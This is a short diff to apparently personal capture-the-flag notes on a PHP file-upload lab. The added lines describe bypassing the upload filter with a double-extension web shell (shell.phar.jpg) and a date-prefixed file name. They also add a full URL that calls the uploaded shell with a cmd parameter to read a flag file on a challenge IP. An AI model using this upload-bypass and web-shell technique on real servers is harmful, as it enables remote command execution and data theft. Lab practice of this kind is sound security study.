@@ -268,7 +268,8 @@ PD9waHAKJHRhcmdldF9kaXIgPSAiLi9pbWFnZXMvIjsKJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxF
 
 Steps:
 1.
-2.
+2.shell.phar.jpg
+3.year month day at the beginning of the file name like 200808
 
 
 ```bash
@@ -340,6 +341,7 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
     echo "File failed to upload";
 }
 
+http://94.237.50.83:48771/contact/user_feedback_submissions/240808_shell.phar.jpg?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+
 ```
 
-file.phar.png
